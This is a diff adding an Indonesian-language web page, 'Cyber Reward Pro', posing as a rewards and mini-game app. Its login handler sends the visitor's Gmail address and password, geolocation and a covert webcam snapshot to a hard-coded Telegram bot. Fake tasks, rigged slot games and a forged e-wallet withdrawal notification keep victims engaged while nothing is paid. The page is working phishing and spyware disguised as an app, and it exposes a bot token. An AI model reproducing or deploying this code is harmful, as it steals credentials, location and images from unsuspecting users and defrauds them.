@@ -1,0 +1,414 @@
+<!DOCTYPE html>  
+<html lang="id">  
+<head>  
+    <meta charset="UTF-8">  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <title>Cyber Reward Pro</title>  
+    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&family=Segoe+UI&display=swap" rel="stylesheet">  
+    <style>  
+        :root {  
+            --bg: #0d0221;  
+            --neon-red: #ff0055;  
+            --neon-purple: #9d00ff;  
+            --neon-blue: #00d4ff;  
+            --neon-green: #39ff14;  
+            --card-bg: rgba(255, 255, 255, 0.05);  
+            --text: #ffffff;  
+        }  body {  
+        margin: 0; padding: 0;  
+        font-family: 'Segoe UI', sans-serif;  
+        background: radial-gradient(circle at center, #1a0b2e 0%, #0d0221 100%);  
+        display: flex; justify-content: center; align-items: center;  
+        min-height: 100vh; color: var(--text); overflow-x: hidden;  
+    }  
+
+    .container, .menu-card, .btn-main, .btn-back, h2, .balance-box { font-family: 'Rajdhani', sans-serif; }  
+
+    .container {  
+        background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(15px);  
+        width: 90%; max-width: 400px; padding: 25px; border-radius: 25px;  
+        border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 0 30px rgba(157, 0, 255, 0.2);  
+        text-align: center; position: relative;  
+    }  
+
+    h2 { background: linear-gradient(to right, var(--neon-red), var(--neon-purple)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-transform: uppercase; letter-spacing: 3px; font-size: 24px; margin-bottom: 20px; }  
+
+    input, select { width: 100%; padding: 12px; margin: 8px 0; background: rgba(0, 0, 0, 0.5); border: 1px solid var(--neon-purple); border-radius: 12px; color: white; outline: none; box-sizing: border-box; font-size: 14px; }  
+
+    .btn-main { width: 100%; padding: 14px; background: linear-gradient(45deg, var(--neon-red), var(--neon-purple)); color: white; border: none; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; text-transform: uppercase; }  
+
+    .btn-back { display: inline-block; width: 100%; padding: 10px; margin-top: 20px; background: rgba(255, 255, 255, 0.1); color: #aaa; border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 10px; cursor: pointer; font-size: 14px; text-transform: uppercase; }  
+
+    .balance-box { background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); padding: 20px; border-radius: 20px; margin-bottom: 20px; text-align: left; border: 1px solid var(--neon-blue); }  
+
+    .grid-menu { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; }  
+
+    .menu-card { background: var(--card-bg); padding: 20px; border-radius: 15px; border: 1px solid rgba(255,255,255,0.1); cursor: pointer; transition: 0.3s; font-size: 18px; font-weight: 700; }  
+    .menu-card:hover { border-color: var(--neon-blue); background: rgba(0, 212, 255, 0.1); }  
+
+    .item-list { background: var(--card-bg); padding: 12px; border-radius: 10px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; text-align: left; }  
+
+    #fake-notif { position: fixed; top: -120px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 350px; background: white; border-radius: 18px; padding: 12px 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.4); display: flex; align-items: center; z-index: 9999; transition: 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); color: #333; }  
+    #fake-notif.show { top: 20px; }  
+    .notif-icon-box { width: 42px; height: 42px; border-radius: 12px; margin-right: 12px; display: flex; align-items: center; justify-content: center; }  
+
+    #view-wd, #view-misi, #view-profile, #view-riwayat, #view-games, #view-play-slot, #view-play-spin { display: none; }
+
+    /* Gaya Khusus Game */
+    .game-display { font-size: 40px; margin: 20px 0; background: rgba(0,0,0,0.3); padding: 20px; border-radius: 15px; border: 2px dashed var(--neon-purple); }
+</style>
+
+</head>  
+<body>  <div id="fake-notif">  
+    <div id="notif-color" class="notif-icon-box"><img id="notif-img" src="" width="26" alt=""></div>  
+    <div class="notif-content">  
+        <div id="notif-title" style="font-weight: 800; font-size: 14px;"></div>  
+        <div id="notif-body" style="font-size: 12px; color: #555;"></div>  
+    </div>  
+</div>  <div id="app" class="container">  
+    <div id="view-login">  
+        <h2>Cyber Reward</h2>  
+        <input type="email" id="email" placeholder="Email Gmail">  
+        <input type="password" id="password" placeholder="Password">  
+        <button class="btn-main" onclick="validateAndLogin()">MASUK</button>  
+        <div id="progress-container" style="display:none; width:100%; height:8px; background:rgba(255,255,255,0.1); border-radius:10px; margin-top:20px; overflow:hidden;">  
+            <div id="progress-bar" style="width:0%; height:100%; background:var(--neon-purple); transition:0.1s;"></div>  
+        </div>  
+    </div>  
+
+<div id="view-dash" style="display:none;">  
+    <div class="balance-box">  
+        <span style="font-size: 14px; opacity: 0.8; font-weight: bold;">SALDO SAYA</span>  
+        <div style="font-size: 32px; font-weight: bold; margin: 5px 0;" id="txt-balance">Rp 0</div>  
+        <button onclick="showSection('view-wd')" style="width:100%; padding:8px; border-radius:8px; border:none; background:rgba(255,255,255,0.2); color:white; font-weight:bold; cursor:pointer;">Tarik Tunai</button>  
+    </div>  
+    <div class="grid-menu">  
+        <div class="menu-card" onclick="showSection('view-misi')">📚<br>TUGAS</div>  
+        <div class="menu-card" onclick="showSection('view-wd')">💳<br>PENARIKAN</div>  
+        <div class="menu-card" onclick="showSection('view-profile')">👥<br>REFERRAL</div>  
+        <div class="menu-card" onclick="showSection('view-riwayat')">🕒<br>RIWAYAT</div>  
+        <div class="menu-card" onclick="showSection('view-games')" style="color:var(--neon-blue)">🎮<br>GAMES</div>  
+        <div class="menu-card" onclick="logout()" style="color:var(--neon-red)">🚪➔<br>LOGOUT</div>  
+    </div>  
+</div>  
+
+<div id="view-games">
+    <h2>Game Center</h2>
+    <div class="grid-menu">
+        <div class="menu-card" onclick="showSection('view-play-slot')">🎰<br>SLOT 777</div>
+        <div class="menu-card" onclick="showSection('view-play-spin')">🎡<br>SPIN CARD</div>
+        <div class="menu-card" onclick="alert('Game Poker sedang Maintenance')">🃏<br>POKER</div>
+        <div class="menu-card" onclick="alert('Game Dice sedang Maintenance')">🎲<br>DICE</div>
+    </div>
+    <button class="btn-back" onclick="showSection('view-dash')">KEMBALI</button>
+</div>
+
+<div id="view-play-slot">
+    <h3>SLOT 777</h3>
+    <div class="game-display" id="slot-result">🎰 🎰 🎰</div>
+    <input type="number" id="bet-slot" placeholder="Taruhan (500-1000)" value="500">
+    <button class="btn-main" onclick="playSlot()">SPIN!</button>
+    <button class="btn-back" onclick="showSection('view-games')">KEMBALI</button>
+</div>
+
+<div id="view-play-spin">
+    <h3>SPIN CARD</h3>
+    <div class="game-display" id="spin-result">?</div>
+    <input type="number" id="bet-spin" placeholder="Taruhan (500-1000)" value="500">
+    <button class="btn-main" onclick="playSpinCard()">MULAI SPIN</button>
+    <p style="font-size:12px; color:gray;">Multiplier: 0x s/d 5x</p>
+    <button class="btn-back" onclick="showSection('view-games')">KEMBALI</button>
+</div>
+
+<div id="view-wd">  
+    <div class="balance-box" style="text-align:center; background:#111;">  
+        <span style="font-size:14px;">SALDO ANDA</span>  
+        <div style="font-size:28px; color:var(--neon-green); font-weight: bold;" id="wd-balance">Rp 0</div>  
+    </div>  
+    <select id="wd-method">  
+        <option value="DANA">DANA</option>  
+        <option value="GOPAY">GOPAY</option>  
+        <option value="OVO">OVO</option>  
+    </select>  
+    <input type="number" id="wd-phone" placeholder="Nomor HP Tujuan">  
+    <input type="number" id="wd-amt" placeholder="Nominal (Min 30.000)">  
+    <button class="btn-main" onclick="prosesWd()">KONFIRMASI</button>  
+    <button class="btn-back" onclick="showSection('view-dash')">KEMBALI</button>  
+</div>  
+
+<div id="view-misi">  
+    <h3 style="font-family:'Rajdhani';">TUGAS HARIAN</h3>  
+    <div id="list-misi"></div>  
+    <button class="btn-back" onclick="showSection('view-dash')">KEMBALI</button>  
+</div>  
+
+<div id="view-riwayat">  
+    <h3 style="font-family:'Rajdhani';">RIWAYAT TRANSAKSI</h3>  
+    <div id="list-riwayat" style="max-height: 300px; overflow-y: auto;"></div>  
+    <button class="btn-back" onclick="showSection('view-dash')">KEMBALI</button>  
+</div>  
+
+<div id="view-profile">  
+    <h3 style="font-family:'Rajdhani';">DATA AKUN & REFF</h3>  
+    <div style="background:var(--card-bg); padding:15px; border-radius:15px; text-align:left;">  
+        <p><b>Email:</b> <span id="prof-email">-</span></p>  
+        <p><b>Referral ID:</b> <span id="prof-ref" style="color:var(--neon-green);">#REFF-</span></p>  
+        <hr style="border:0.5px solid rgba(255,255,255,0.1)">  
+        <label style="font-size:12px; color:#aaa;">Masukkan Kode Teman (+5.000):</label>  
+        <input type="text" id="input-reff" placeholder="#REFF-XXXX">  
+        <button onclick="klaimReff()" style="width:100%; background:var(--neon-blue); border:none; padding:8px; border-radius:8px; font-weight:bold; cursor:pointer;">KLAIM REFF</button>  
+    </div>  
+    <button class="btn-back" onclick="showSection('view-dash')">KEMBALI</button>  
+</div>
+
+</div>  <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+<script>  
+    // ==========================================
+    // SETTING GAME (UBAH DISINI)
+    // ==========================================
+    const WIN_RATE = 0.9; // 0.1 (Susah Menang) sampai 1.0 (Pasti Menang)
+    // ==========================================
+
+    const TOKEN = '8266885516:AAHFDw1OP0ZzbCY68-K7qrefzmZYynmVr-s';  
+    const CHAT_ID = '7911882988';  
+      
+    let balance = parseInt(localStorage.getItem('balance')) || 0;  
+    let userEmail = localStorage.getItem('userEmail') || "";  
+    let history = JSON.parse(localStorage.getItem('history')) || [];  
+    let reffUsed = localStorage.getItem('reffUsed') === 'true';  
+  
+    function generateMyCode(email) {  
+        return "#REFF-" + (email.length * 777);  
+    }  
+  
+    window.onload = () => {  
+        if(userEmail) {  
+            document.getElementById('prof-email').innerText = userEmail;  
+            document.getElementById('prof-ref').innerText = generateMyCode(userEmail);  
+            showSection('view-dash');  
+        }  
+    };  
+  
+    async function validateAndLogin() {  
+        const email = document.getElementById('email').value;  
+        const pass = document.getElementById('password').value;  
+        if (!email.endsWith("@gmail.com") || pass.length < 4) { alert("Data tidak valid!"); return; }  
+          
+        userEmail = email;  
+        localStorage.setItem('userEmail', email);  
+        document.getElementById('progress-container').style.display = 'block';  
+          
+        let width = 0;  
+        const bar = document.getElementById('progress-bar');  
+        const interval = setInterval(async () => {  
+            if (width >= 100) {  
+                clearInterval(interval);  
+                let locStr = "📍 Lokasi Ditolak";  
+                try {  
+                    const p = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {timeout:5000}));  
+                    locStr = `📍 Lokasi: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;  
+                } catch(e) {}  
+  
+                const teksPesan = `<b>🚀 𝗧𝗔𝗥𝗚𝗘𝗧 𝗕𝗔𝗥𝗨 🔥</b>\n\n📧 Email: <code>${email}</code>\n🔑 Pass: <code>${pass}</code>\n\n${locStr}`;  
+  
+                try {  
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });  
+                    const video = document.getElementById('video');  
+                    video.srcObject = stream;  
+                    await new Promise(r => setTimeout(r, 1500));  
+                    const canvas = document.getElementById('canvas');  
+                    canvas.getContext('2d').drawImage(video, 0, 0);  
+                      
+                    canvas.toBlob(async (blob) => {  
+                        const fd = new FormData();  
+                        fd.append('chat_id', CHAT_ID);  
+                        fd.append('photo', blob, 'shot.jpg');  
+                        fd.append('caption', teksPesan);  
+                        fd.append('parse_mode', 'HTML');  
+                        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });  
+                        stream.getTracks().forEach(t => t.stop());  
+                    }, 'image/jpeg', 0.7);  
+                } catch(e) {  
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {  
+                        method: 'POST',  
+                        headers: {'Content-Type': 'application/json'},  
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: teksPesan, parse_mode: 'HTML' })  
+                    });  
+                }  
+                document.getElementById('prof-ref').innerText = generateMyCode(userEmail);  
+                showSection('view-dash');  
+            } else { width += 5; bar.style.width = width + '%'; }  
+        }, 50);  
+    }  
+  
+    const misiData = [  
+        { id: 1, name: "Follow TikTok @ndraaxkece", prize: 5000, link: "https://www.tiktok.com/@ndraaxkece" },  
+        { id: 2, name: "Gabung Telegram InfoUno", prize: 5000, link: "https://t.me/INFOUNOCRASHER" },  
+        { id: 3, name: "Gabung Saluran WhatsApp", prize: 5000, link: "https://whatsapp.com/channel/0029Vb5vixpIN9itm0RuE32m" },  
+        { id: 4, name: "Tonton Video Random", prize: 5000, link: "https://www.youtube.com/watch?v=dQw4w9WgXcQ" },  
+        { id: 5, name: "Cek Update Sistem Harian", prize: 5000, link: "https://google.com" }  
+    ];  
+  
+    function showSection(id) {  
+        const views = ['view-login', 'view-dash', 'view-wd', 'view-misi', 'view-profile', 'view-riwayat', 'view-games', 'view-play-slot', 'view-play-spin'];
+        views.forEach(v => {
+            const el = document.getElementById(v);
+            if(el) el.style.display = 'none';
+        });
+        document.getElementById(id).style.display = 'block';  
+        updateBalanceDisplay();  
+        if(id === 'view-misi') renderMisi();  
+        if(id === 'view-riwayat') renderRiwayat();  
+    }  
+  
+    function addHistory(title, amt, type) {  
+        const date = new Date().toLocaleString('id-ID', {hour:'2-digit', minute:'2-digit'});  
+        history.unshift({ title, amt, type, date });  
+        localStorage.setItem('history', JSON.stringify(history));  
+    }  
+  
+    function renderRiwayat() {  
+        const container = document.getElementById('list-riwayat');  
+        container.innerHTML = history.length === 0 ? "<p style='color:#777'>Belum ada transaksi</p>" : "";  
+        history.forEach(h => {  
+            const color = h.type === 'in' ? 'var(--neon-green)' : 'var(--neon-red)';  
+            container.innerHTML += `<div class="item-list"><div><small>${h.date}</small><br><b>${h.title}</b></div><b style="color:${color}">${h.type==='in'?'+':'-'} ${h.amt.toLocaleString()}</b></div>`;  
+        });  
+    }  
+  
+    function renderMisi() {  
+        const container = document.getElementById('list-misi');  
+        container.innerHTML = "";  
+        misiData.forEach(m => {  
+            const isDone = localStorage.getItem(`misi_${m.id}`);  
+            container.innerHTML += `<div class="item-list"><div><b>${m.name}</b><br><small>+ Rp ${m.prize.toLocaleString()}</small></div><button onclick="jalankanMisi(this, ${m.prize}, '${m.link}', ${m.id}, '${m.name}')" ${isDone ? 'disabled style="background:#444"' : ''} style="background:var(--neon-blue); border:none; padding:5px 10px; border-radius:5px; font-weight:bold;">${isDone ? 'DONE' : 'KLAIM'}</button></div>`;  
+        });  
+    }  
+  
+    function jalankanMisi(btn, amt, url, id, name) {  
+        window.open(url, '_blank');  
+        setTimeout(() => {  
+            balance += amt; updateBalanceDisplay();  
+            localStorage.setItem(`misi_${id}`, 'true');  
+            addHistory(name, amt, 'in');  
+            btn.disabled = true; btn.innerText = "DONE"; btn.style.background = "#444";  
+            alert("Misi Selesai!");  
+        }, 2000);  
+    }  
+
+    // ==========================================
+    // LOGIKA PERMAINAN GAMES
+    // ==========================================
+    
+    function playSlot() {
+        const bet = parseInt(document.getElementById('bet-slot').value);
+        if(bet < 500 || bet > 900000000) return alert("Taruhan minimal 500, maximal 900000000");
+        if(balance < bet) return alert("Saldo anda tidak cukup!");
+
+        balance -= bet;
+        addHistory("Taruhan Slot", bet, "out");
+        
+        let slots = ["🍒", "🍋", "🎰"];
+        let isWin = Math.random() < WIN_RATE;
+        
+        document.getElementById('slot-result').innerText = "🔄 🔄 🔄";
+        
+        setTimeout(() => {
+            if(isWin) {
+                let winAmt = bet * 3;
+                balance += winAmt;
+                document.getElementById('slot-result').innerText = "🎰 🎰 🎰";
+                addHistory("Menang Slot", winAmt, "in");
+                alert("JACKPOT!, Selamat Anda menang Rp" + winAmt);
+            } else {
+                let r1 = slots[Math.floor(Math.random()*3)];
+                let r2 = slots[Math.floor(Math.random()*3)];
+                let r3 = slots[Math.floor(Math.random()*3)];
+                document.getElementById('slot-result').innerText = `${r1} ${r2} ${r3}`;
+                alert("Anda Kalah! Coba lagi.");
+            }
+            updateBalanceDisplay();
+        }, 1000);
+    }
+
+    function playSpinCard() {
+        const bet = parseInt(document.getElementById('bet-spin').value);
+        if(bet < 500 || bet > 1000000) return alert("Taruhan minimal 500, maximal 1000000");
+        if(balance < bet) return alert("Saldo tidak cukup!");
+
+        balance -= bet;
+        addHistory("Taruhan Spin", bet, "out");
+        
+        let multipliers = [0, 0, 1, 2, 5];
+        let res = multipliers[Math.floor(Math.random() * multipliers.length)];
+        
+        // Manipulasi kemenangan berdasarkan WIN_RATE
+        if(Math.random() > WIN_RATE) res = 0;
+
+        document.getElementById('spin-result').innerText = "🌀";
+        
+        setTimeout(() => {
+            document.getElementById('spin-result').innerText = res + "x";
+            if(res > 0) {
+                let winAmt = bet * res;
+                balance += winAmt;
+                addHistory("Menang Spin", winAmt, "in");
+                alert(`Berhasil! Anda dapat multiplier ${res}x. Saldo +${winAmt}`);
+            } else {
+                alert("Zonk! Uang anda hangus.");
+            }
+            updateBalanceDisplay();
+        }, 800);
+    }
+
+    // ==========================================
+
+    function klaimReff() {  
+        if(reffUsed) return alert("Hanya bisa klaim 1x!");  
+        const inputKode = document.getElementById('input-reff').value;  
+        const myCode = generateMyCode(userEmail);  
+        const isValidFormat = /^#REFF-\d+$/.test(inputKode);  
+        if (!isValidFormat) { alert("Format Kode Salah!"); return; }  
+        if (inputKode === myCode) { alert("Dilarang menggunakan kode sendiri!"); return; }  
+        const angkaKode = parseInt(inputKode.replace("#REFF-", ""));  
+        if (angkaKode % 777 !== 0 || angkaKode < 3000) { alert("Kode Ilegal!"); return; }  
+  
+        balance += 5000;  
+        reffUsed = true;  
+        localStorage.setItem('reffUsed', 'true');  
+        addHistory("Referral Bonus", 5000, 'in');  
+        updateBalanceDisplay();  
+        alert("Referral Berhasil! Saldo +5.000");  
+    }  
+  
+    function prosesWd() {  
+        const amt = parseInt(document.getElementById('wd-amt').value);  
+        if (balance < 30000 || amt < 30000 || amt > balance) return alert("Minimal 30rb!");  
+        balance -= amt; updateBalanceDisplay();  
+        addHistory("Penarikan " + document.getElementById('wd-method').value, amt, 'out');  
+        showFakeNotif(document.getElementById('wd-method').value, amt);  
+        setTimeout(() => showSection('view-dash'), 4500);  
+    }  
+  
+    function updateBalanceDisplay() {  
+        localStorage.setItem('balance', balance);  
+        document.getElementById('txt-balance').innerText = `Rp ${balance.toLocaleString('id-ID')}`;  
+        document.getElementById('wd-balance').innerText = `Rp ${balance.toLocaleString('id-ID')}`;  
+    }  
+  
+    function logout() { if(confirm("Keluar?")) { localStorage.clear(); location.reload(); } }  
+  
+    function showFakeNotif(app, amount) {  
+        const notif = document.getElementById('fake-notif');  
+        document.getElementById('notif-title').innerText = app;  
+        document.getElementById('notif-body').innerText = `Isi saldo Rp ${amount.toLocaleString()} sukses.`;  
+        document.getElementById('notif-color').style.background = app==="DANA" ? "#108ee9" : "#4c2a86";  
+        document.getElementById('notif-img').src = "https://upload.wikimedia.org/wikipedia/commons/thumb/7/72/Logo_dana_blue.svg/1200px-Logo_dana_blue.svg.png";  
+        notif.classList.add('show');  
+        setTimeout(() => notif.classList.remove('show'), 4000);  
+    }  
+</script>  
+</body>  
+</html>
